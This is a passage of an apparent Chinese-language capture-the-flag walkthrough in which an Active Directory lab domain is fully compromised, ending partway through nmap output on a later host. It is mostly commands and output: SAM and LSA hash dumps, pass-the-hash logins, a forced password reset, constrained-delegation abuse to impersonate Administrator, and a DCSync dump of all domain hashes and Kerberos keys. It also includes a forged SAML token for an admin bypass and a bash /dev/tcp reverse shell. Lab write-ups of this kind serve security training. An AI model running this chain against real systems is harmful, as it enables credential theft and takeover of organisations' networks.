Info: Download successful!
*Evil-WinRM* PS C:\> download security.save
                                        
Info: Downloading C:\\security.save to security.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\> download system.save
                                        
Info: Downloading C:\\system.save to system.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\> 
                                        
Warning: Press "y" to exit, press any other key to continue
                                        
Info: Exiting...
                                                                                                                   
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'secretsdump.py')
Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra

[*] Target system bootKey: 0xb131ea5c8206a94e3d32119d035961a9
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6ee87fa6593a4798fe651f5f5a4e663e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
[*] Dumping cached domain logon information (domain/username:hash)
PAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2023-12-15 06:13:08)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:9c2295062db39652dd63b214344ce839af0ab487e64efc62923556fd6515e24f383f0f9a34006bae1f108446483b2e8c54a2d0bd08388b0e47dc12ad75a1859c45c917072bb683477e379108ff3131bcb52a4d4a2046c6c6f6252945e4b4e3c465a33a379854b4771e7cec30db10df8990bb0867c826c50d8d0646d4f817d70becbf98058e81d6a5b0f606263ea3c6495ff553bef55ee6fe109d03e5237ad0061f9ed7f0694d5c9be2a87379b82491871df259d251ff8a114d76961009551f53a5abaa1d51d7aa1d06d6e730a1a14797d33f71c3690eea3a00a09711f2053872d9dc815e3de06808e6b681c737cc9e33
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6a28296d276ce0627958e99cfbcab0b54ff64355
dpapi_userkey:0xaf502a3258e233f29ce3ca24257f5877965bb87d
[*] NL$KM 
 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W
 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..
 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%
 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.
NL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7
[*] Cleaning up...
```
## 192.168.110.53(nmap\james)
```python

```
### PTH登陆
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# proxychains evil-winrm -u james -H 8af1903d3c80d3552a84b6ba296db2ea  -i 192.168.110.53
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.53:5985  ...  OK
*Evil-WinRM* PS C:\Users\James\Documents>
```
### 分析bloodhound

#### ForceChangePassword
首先需要使用evil-winrm(方便上传文件)登陆james
上传PowerView.ps1
```python
*Evil-WinRM* PS C:\> upload /home/rookie/Desktop/PowerView.ps1
                                        
Info: Uploading /home/rookie/Desktop/PowerView.ps1 to C:\\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\> 
```
:::tip
```
Import-Module .\PowerView.ps1
$UserPassword = ConvertTo-SecureString 'NewPassword123!@#$' -AsPlainText -Force
Set-DomainUserPassword -Identity BLAKE -AccountPassword $UserPassword
```
:::
运用powerview更改BLAKE密码
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# proxychains psexec.py james@192.168.110.53 -target-ip 192.168.110.53 -hashes aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/usr/local/bin/psexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'psexec.py')
Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.53:445  ...  OK
[*] Requesting shares on 192.168.110.53.....
[*] Found writable share ADMIN$
[*] Uploading file eMBUMseW.exe
[*] Opening SVCManager on 192.168.110.53.....
[*] Creating service BhnS on 192.168.110.53.....
[*] Starting service BhnS.....
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.53:445  ...  OK
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.53:445 [!] Press help for extra shell commands
 ...  OK
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.53:445  ...  OK
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:/
 
C:\> Import-Module .\PowerView.ps1
'Import-Module' is not recognized as an internal or external command,
operable program or batch file.

C:\> powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

Import-Module .\PowerView.ps1
PS C:\> Import-Module .\PowerView.ps1
$UserPassword = ConvertTo-SecureString 'NewPassword123!@#$' -AsPlainText -Force
PS C:\> $UserPassword = ConvertTo-SecureString 'NewPassword123!@#$' -AsPlainText -Force
Set-DomainUserPassword -Identity BLAKE -AccountPassword $UserPassword
PS C:\> Set-DomainUserPassword -Identity BLAKE -AccountPassword $UserPassword
```
## 192.168.110.54(nmap\blake)
```python
riley@mail:~$ ./nmap -Pn -T4 -sT --min-rate="1000" -p-  192.168.110.54

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-04 08:49 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.110.54
Host is up (0.00091s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
5985/tcp open  unknown
```
### 密码登陆
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─#  proxychains evil-winrm -u BLAKE -p 'NewPassword123!@#$'  -i 192.168.110.54
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.54:5985  ...  OK
*Evil-WinRM* PS C:\Users\Blake\Documents>
```
#### 拖取hash
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─#  secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'secretsdump.py')
Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra

[*] Target system bootKey: 0xe84cfc715ea5d48c94b35796175e802a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ea794e50c1ac708c1db3aa025aeb5ea:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
PAINTERS.HTB/blake:$DCC2$10240#blake#208c8e5baa521a823aff62fafef30cfc: (2023-02-27 13:07:57)
PAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2023-12-15 06:12:40)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:57979742bad762e01f40005c6919cdd6229188a6d6c0ee28791d778d29b054f7771cfca78db3482d6b15dfa2a57b43d23436019a0c25115e433b099a5f2c724b56b04f29a2f8b8993541d1f19b863884bee36c5be01c069d193e72621d9afe0ffcd4a17da90028a61cad9e0cb1a0699b6fd4e3596d3514dc136d3c82cb67c9afbb759e035e24925272c4f32a9affc6cdfde394a73e4c2ec683e2af6c4db364a11c8c5a09136490e7f94b93fb0e4c8a7b0a9db42f761435d0519ec3cfba69ef72d59c9d86d107efb06a1444ffc6bb1807b6c8727c3501f21b0698a50582a37dfcb707500e2ee1bb799e1d412707c035b2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7fc6b6b4b44a96617b5829a888b5a85a
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xeea0ab26089b4c01128ff703571d5f50ef86f728
dpapi_userkey:0x762a420566ee06d418442baba8d351d242b38442
[*] NL$KM 
 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W
 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..
 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%
 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.
NL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7
[*] Cleaning up...
```
#### 发现委派(受协议转换约束)
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─#  proxychains findDelegation.py "PAINTERS.HTB"/"BLAKE":'NewPassword123!@#$' -dc-ip 192.168.110.55
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/usr/local/bin/findDelegation.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'findDelegation.py')
Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:389  ...  OK
AccountName  AccountType  DelegationType                      DelegationRightsTo    SPN Exists 
-----------  -----------  ----------------------------------  --------------------  ----------
blake        Person       Constrained w/ Protocol Transition  CIFS/dc.painters.htb  Yes        
blake        Person       Constrained w/ Protocol Transition  CIFS/DC               Yes        
daniel       Person       Constrained                         CIFS/dc.painters.htb  Yes        
daniel       Person       Constrained                         CIFS/DC               Yes
```
## 192.168.110.55(dc)

### GetST.py
```python
┌──(root㉿Rookie)-[/home/…/Desktop/github/impacket/examples]
└─# proxychains getST.py -dc-ip 192.168.110.55 -spn CIFS/dc.painters.htb -impersonate Administrator  PAINTERS.HTB/blake:'NewPassword123!@#$'

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/usr/local/bin/getST.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'getST.py')
Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:88  ...  OK
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:88  ...  OK
[*] Impersonating Administrator
[*] Requesting S4U2self
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:88  ...  OK
[*] Requesting S4U2Proxy
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:88  ...  OK
[*] Saving ticket in Administrator@CIFS_dc.painters.htb@PAINTERS.HTB.ccache
```
### PTT登陆
终端加载
```python
┌──(root㉿Rookie)-[/home/…/Desktop/github/impacket/examples]
└─# export KRB5CCNAME=Administrator@CIFS_dc.painters.htb@PAINTERS.HTB.ccache
```
```python
┌──(root㉿Rookie)-[/home/…/Desktop/github/impacket/examples]
└─# proxychains psexec.py PAINTERS.HTB/Administrator@dc.painters.htb -k -no-pass  -dc-ip 192.168.110.55
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/usr/local/bin/psexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'psexec.py')
Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:445  ...  OK
[*] Requesting shares on dc.painters.htb.....
[*] Found writable share ADMIN$
[*] Uploading file QZOsesPo.exe
[*] Opening SVCManager on dc.painters.htb.....
[*] Creating service gIWO on dc.painters.htb.....
[*] Starting service gIWO.....
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:445  ...  OK
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:445 [!] Press help for extra shell commands
 ...  OK
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:445  ...  OK
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami                       
nt authority\system

```
### 拖取hash
```python
┌──(root㉿Rookie)-[/home/…/Desktop/github/impacket/examples]
└─# proxychains secretsdump.py PAINTERS.HTB/Administrator@dc.painters.htb -k -no-pass  -dc-ip 192.168.110.55

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'secretsdump.py')
Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x26e642aeb927768190bf01f71ffcc079
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PAINTERS\DC$:plain_password_hex:f1e223bb02500686631057a53dbbbff423ebc5664b1cd267bd081b768d2cbcb9938882e143b530ba28156026d9903257f2ced1173a6795809e3e3d36bda4c236804cab3bb70eecaadd196afe757493262552fb6e38646fc87845d5ac55b55e50ffd399e1ed6cec8bb8efc7144904701586b9f3c93011be4d1c466e5b90585ac8175ef10d2b27ae87b7c763b0e3425325b43140c634e2faa952ae80163e4b296d13bcf0446c75907775a72820caf741a7d35e978cbdbc6daa559b5513783ba258b7604263686767bbb263df03e758aa8806122808a157172684d80547c0945c1dcfb348e0d5a54d2d1334da4f8075898f
PAINTERS\DC$:aad3b435b51404eeaad3b435b51404ee:5869ab656006ee71af41d437a6788093:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xfecd1b4601f1f1becf33b389ffa2eff5d8bc8cd3
dpapi_userkey:0x6130d2e50c7b21539230412422edeb0071253077
[*] NL$KM 
 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W
 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..
 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%
 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.
NL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:135  ...  OK
[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:49667  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b59ffc1f7fcd615577dab8436d3988fc:::
riley:1106:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
blake:1107:aad3b435b51404eeaad3b435b51404ee:1a1ecf1f217235e278073199dffa9f4c:::
gavin:1108:aad3b435b51404eeaad3b435b51404ee:cb8ec920398da9fbb7c33b7b613b28d5:::
daniel:1109:aad3b435b51404eeaad3b435b51404ee:b084c663ad3f214e516e6f89c81c80d7:::
tom:1110:aad3b435b51404eeaad3b435b51404ee:dc51a409ab6cf835cbb9e471f27d8bc6:::
web_svc:1111:aad3b435b51404eeaad3b435b51404ee:502472f625746727fa99566032383067:::
painters.htb\Matt:4101:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:5869ab656006ee71af41d437a6788093:::
PNT-SVRSVC$:1103:aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5:::
PNT-SVRBPA$:1104:aad3b435b51404eeaad3b435b51404ee:2dfcebbe9f5f4cb3bf98032887b3d7b6:::
PNT-SVRPSB$:1105:aad3b435b51404eeaad3b435b51404ee:7fc6b6b4b44a96617b5829a888b5a85a:::
MAINTENANCE$:2101:aad3b435b51404eeaad3b435b51404ee:6db918e3d0a23093360a17711ac9c59a:::
WORKSTATION-1$:2103:aad3b435b51404eeaad3b435b51404ee:9ab46ef513f6f74ddf1ab492b8f542fa:::
ZSM$:2102:aad3b435b51404eeaad3b435b51404ee:68d23d52ad8d8005d7bf830856cd0600:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:d5d7a2fd36d4ede3aaf21537b504df92a32e2e70c37187efe42b6263897ead36
Administrator:aes128-cts-hmac-sha1-96:f6139559372a236bde1524329d2aa492
Administrator:des-cbc-md5:807c2a64b3c8b379
krbtgt:aes256-cts-hmac-sha1-96:39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b
krbtgt:aes128-cts-hmac-sha1-96:9a6c9880f96f75edd17f648206fb5abd
krbtgt:des-cbc-md5:25f2432654101f40
riley:aes256-cts-hmac-sha1-96:2c9f84f81d7a76eb1f29193107fd2e51834962cc90cfcfafef7ab4baabe59360
riley:aes128-cts-hmac-sha1-96:bc65c97f9324894006a5e389ab91ccec
riley:des-cbc-md5:3e018f85012cc8b0
blake:aes256-cts-hmac-sha1-96:cb055f6c51a9a274e38a297ebc0af1532d6886bb4a37f36a04bc88ff813dc85e
blake:aes128-cts-hmac-sha1-96:5c2a770eccd65e140e653be34a72ab90
blake:des-cbc-md5:c86e3146fbdfc29e
gavin:aes256-cts-hmac-sha1-96:fa583a1938a32986a2c23f7787aa2c3282b96259c89070a01a19e256b58f9992
gavin:aes128-cts-hmac-sha1-96:fbcae12c4967569b398868fb38f0b300
gavin:des-cbc-md5:b54f67f19d8ab367
daniel:aes256-cts-hmac-sha1-96:8bb18fd1df9c7eecfa5c4de65ca4fda6c37efc98a2c94ef8edf8a4e606bc6ffd
daniel:aes128-cts-hmac-sha1-96:ba81e1c1fb60c279aa5c685ede732c8e
daniel:des-cbc-md5:a7455b207f1570ad
tom:aes256-cts-hmac-sha1-96:657f8676662fc4f5ad5bca4c19f1576ff1ce200fa5418860a5483f99d0d05888
tom:aes128-cts-hmac-sha1-96:b1c6797bf5e899d09cf865d30470bb7c
tom:des-cbc-md5:2aea89cb23b6f246
web_svc:aes256-cts-hmac-sha1-96:bc2600db46b90a0deffc6a34f60f9574b82ede49e71d4cf337f11ddf290993d8
web_svc:aes128-cts-hmac-sha1-96:e9c960b6403d6aa5b6b79885e1cc11b0
web_svc:des-cbc-md5:e6b986ae31e34a20
painters.htb\Matt:aes256-cts-hmac-sha1-96:42656beb2852a473c35498f55fbe113d4d722bb2efb36b1689d9b1a60e9cfa03
painters.htb\Matt:aes128-cts-hmac-sha1-96:a79e61bd0ca1d5760d5178e6010af2f7
painters.htb\Matt:des-cbc-md5:624c3458945b4675
DC$:aes256-cts-hmac-sha1-96:3ed6c9f397b46b39a4099ef6ffb834168f1b7abedde82561cee74d3f2cfb1f73
DC$:aes128-cts-hmac-sha1-96:c26f7ec4b891b19151704ac3a45ae0fe
DC$:des-cbc-md5:5e3b4cb002b3f289
PNT-SVRSVC$:aes256-cts-hmac-sha1-96:a31b4a0de42a441e47dad46f283105a9eeaf023831336cf2b2933c2907a63c4a
PNT-SVRSVC$:aes128-cts-hmac-sha1-96:0f5239792536fef683f21de1925b8ca4
PNT-SVRSVC$:des-cbc-md5:0db9624308c7c76b
PNT-SVRBPA$:aes256-cts-hmac-sha1-96:09f22fb6cd45a7a633854dcb861371f7af81676d336121d383c35328c127bee4
PNT-SVRBPA$:aes128-cts-hmac-sha1-96:a064d5c19ffd7dc845c31cbc9bbcc85d
PNT-SVRBPA$:des-cbc-md5:cdec8ff8e9041cb0
PNT-SVRPSB$:aes256-cts-hmac-sha1-96:543458b7a3d85c5f48438b5096ba4653e73ca7291b797691ee96368255ffbab6
PNT-SVRPSB$:aes128-cts-hmac-sha1-96:5db252e5f61efa9b6cfa4404ccc975e7
PNT-SVRPSB$:des-cbc-md5:29f78975e5f20b7f
MAINTENANCE$:aes256-cts-hmac-sha1-96:31846c6b8b5f7a6116d7e2e7a7f3d4b4f4eda46f6dda8e3170a340f387bdb56c
MAINTENANCE$:aes128-cts-hmac-sha1-96:ccb136a8d9d5eed3308a6c4a9a31fc8c
MAINTENANCE$:des-cbc-md5:eaadcb1fc4b0d334
WORKSTATION-1$:aes256-cts-hmac-sha1-96:f65b04cc76d8dc57579d12a0b29b294f6fc25c947fbf7e5dde6c3639330f73c0
WORKSTATION-1$:aes128-cts-hmac-sha1-96:729c49ae39c12a40da4ffb2267366f87
WORKSTATION-1$:des-cbc-md5:f4e00e6bcbe35e62
ZSM$:aes256-cts-hmac-sha1-96:f1c72a419a284370fe91423e3589377673668234ac007f3895e35f59fd238bf5
ZSM$:aes128-cts-hmac-sha1-96:9222b905052239287d02e107f1fd467c
ZSM$:des-cbc-md5:c7e6f89e102a5df1
[*] ClearText passwords grabbed
painters.htb\Matt:CLEARTEXT:L1f30f4Spr1ngCh1ck3n!
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
```
### PTH登陆域控
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# proxychains evil-winrm -i 192.168.110.55 -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  192.248.165.125:60002  ...  192.168.110.55:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
#### 发现域信任关系及ip
```
*Evil-WinRM* PS C:\Windows> nltest /domain_trusts
List of domain trusts:
    0: ZSM zsm.local (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
    1: PAINTERS painters.htb (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully
*Evil-WinRM* PS C:\Windows> ping zsm.local

Pinging zsm.local [192.168.210.10] with 32 bytes of data:
Reply from 192.168.210.10: bytes=32 time<1ms TTL=127
Reply from 192.168.210.10: bytes=32 time<1ms TTL=127
Reply from 192.168.210.10: bytes=32 time<1ms TTL=127
Reply from 192.168.210.10: bytes=32 time<1ms TTL=127

Ping statistics for 192.168.210.10:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```
## 192.168.210.0/24(nmap)
在域控上面发现log

### 192.168.210.13(nmap/zephyr)
```python
riley@mail:~$ ./nmap 192.168.210.13
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-18 07:09 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.210.13
Host is up (0.00061s latency).
Not shown: 1166 filtered ports
PORT      STATE  SERVICE
53/tcp    closed domain
80/tcp    closed http
88/tcp    closed kerberos
123/tcp   closed unknown
135/tcp   closed epmap
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   closed netbios-ssn
389/tcp   closed ldap
443/tcp   open   https
445/tcp   closed microsoft-ds
464/tcp   closed kpasswd
636/tcp   closed ldaps
57000/tcp closed dircproxy
60177/tcp closed tfido
60179/tcp closed fido
```
#### 登陆https

:::tip
```
只要更改为{"saml_data":{"username_attribute":"Admin"},"sessionid":"99c65fd664e1e0bb929d8a9d964f0a98","sign":"2cd21893210753d4d2926aa08fe7ebefdd41a8ab6413bb551ce048848b1dda44"}这样的就可以,越权登陆了
eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiOTljNjVmZDY2NGUxZTBiYjkyOWQ4YTlkOTY0ZjBhOTgiLCJzaWduIjoiMmNkMjE4OTMyMTA3NTNkNGQyOTI2YWEwOGZlN2ViZWZkZDQxYThhYjY0MTNiYjU1MWNlMDQ4ODQ4YjFkZGE0NCJ9
```
:::
提权并反弹shell
bash -c 'bash -i  >& /dev/tcp/192.168.110.51/445 0>&1'
```python
riley@mail:~$ su matt
Password: L1f30f4Spr1ngCh1ck3n!
matt@mail:/home/riley$ nc -lvnp 445
nc: Permission denied
matt@mail:/home/riley$ sudo nc -lvnp 445
[sudo] password for matt: 
Listening on 0.0.0.0 445
Connection received on 192.168.210.13 39950
bash: cannot set terminal process group (9475): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@zephyr:/$ whoami
whoami
zabbix
zabbix@zephyr:/$ sudo -l
sudo -l
Matching Defaults entries for zabbix on zephyr:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zabbix may run the following commands on zephyr:
    (root) NOPASSWD: /usr/bin/nmap
zabbix@zephyr:/$ /usr/bin/nmap 192.168.210.13
/usr/bin/nmap 192.168.210.13
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 07:24 UTC
Nmap scan report for zephyr (192.168.210.13)
